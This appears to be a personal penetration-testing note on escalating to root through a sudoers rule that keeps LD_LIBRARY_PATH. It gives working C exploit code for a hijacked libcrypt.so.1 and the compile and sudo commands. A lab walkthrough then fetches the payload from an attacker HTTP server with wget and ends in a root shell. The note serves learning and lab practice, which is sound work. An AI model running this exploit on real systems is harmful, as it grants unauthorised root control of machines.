Note: this exploit is extremely similar to the [[env_keep+=LD_PRELOAD exploitation]] exploit.
`LD_LIBRARY_PATH` is an environment variable, which is similar to the `PATH` variable. 
It's used specify the path load the shared objects (`.so` files) called upon by a program.
Sometimes it can be specified in the `/etc/sudoers` file, which can be listed using `sudo -l`.

#### Checking for vulnerability
###### Note: If the `sudo -l` output is available, LinPEAS will flag the `LD_LIBRARY_PATH` if vulnerable. Usually, you need to enter the `sudo -l` with a password to see. If this isn't done, LinPEAS won't flag it.
First, run `sudo -l`, and check the output. If it contains `LD_LIBRARY_PATH`, it should be vulnerable.
#### Exploitation
Nearly every binary will call for shared objects, and when using the `LD_LIBRARY_PATH` environment variable, it will look in the specified path first.
This means it becomes vulnerable to a hijacking attack, where a false copy with the same name as a legitimate library is used, but has malicious code inside.
The exploitation steps are very similar to `PATH` exploitation.
First, to get the names of the libraries called upon by a binary:
```
ldd FULL_PATH_TO_TARGET_BINARY            // Note: This includes the name of the binary itself (ex: /usr/bin/bash, not /usr/bin)
```
From here, pick any shared object to hijack.
The `libcrypt.so.1` is very common, so we will use it here.

Code (filename: `exploit.c`):
```
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>
static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setuid(0);   // If the user specified to run is different from Sudo, use the UID of that user.
	setgid(0);   // If the group specified to run is different from Sudo, use the GID of that user.
	system("/bin/bash -p");
}
```
Compiling:
```
gcc -o libcrypt.so.1 -shared -fPIC exploit.c
```

This can all be done locally, as long as the architecture and operating system of the target machine and the local machine are the same.

Finally, run the exploit:
```
sudo LD_LIBRARY_PATH=PATH_TO_LIBRARY COMMAND
```
Note: make sure to specify the path to the `libcrypt.so.1` .

### Example
First, to check for vulnerability:
```
rick@Hijack:/tmp/test$ sudo -l
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```
In the third line, the `env_keep+=LD_LIBRARY_PATH` exists, so it's vulnerable.
To check the libraries called upon by the exploitable binary:
```
rick@Hijack:/tmp/test$ ldd /usr/sbin/apache2                                                                           
        linux-vdso.so.1 =>  (0x00007ffdedf6e000)  
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fb5acc54000)                                        
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007fb5aca2d000)                                                                                                                                                 
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007fb5ac7fb000)                              
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb5ac5de000)                              
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb5ac214000)                                           
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007fb5abfdc000)                                 
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007fb5abdb3000)                                 
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007fb5abbae000)                                   
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb5ab9aa000)                                       
        /lib64/ld-linux-x86-64.so.2 (0x00007fb5ad169000)
```
It uses `libcrypt.so.1`, so that will be the name of the binary.
Then, to compile the code from [[#Exploitation]]:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #nvim exploit.c
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
	└──╼ #gcc -o libcrypt.so.1 -shared -fPIC exploit.c
exploit.c: In function ‘_init’:
exploit.c:6:3: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    6 |   setuid(0); // If the user specified to run is different from Sudo, use the UID
      |   ^~~~~~
exploit.c:8:3: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    8 |   setgid(0); // If the group specified to run is different from Sudo, use the
      |   ^~~~~~
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #ls libcrypt.so.1
libcrypt.so.1
```
Getting the binary from the local machine to the target:
```
┌─[root@edu-virtualbox]─[/home/edu/THM/hijack]
└──╼ #python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

rick@Hijack:/tmp/test$ wget http://10.8.1.167:8000/libcrypt.so.1
--2023-10-27 11:07:26--  http://10.8.1.167:8000/libcrypt.so.1
Connecting to 10.8.1.167:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18160 (18K) [application/octet-stream]
Saving to: ‘libcrypt.so.1’
libcrypt.so.1                                                  100%[=========================================================================================================================================>]  17.73K  --.-KB/s    in 0.03s   
2023-10-27 11:07:26 (687 KB/s) - ‘libcrypt.so.1’ saved [18160/18160]
```
Finally, to exploit:
```
rick@Hijack:/tmp/test$ sudo LD_LIBRARY_PATH=/tmp/test /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2                                                                                                                          
/usr/sbin/apache2: /tmp/test/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)                                                                                                        
root@Hijack:/tmp/test# id           
uid=0(root) gid=0(root) groups=0(root)
```
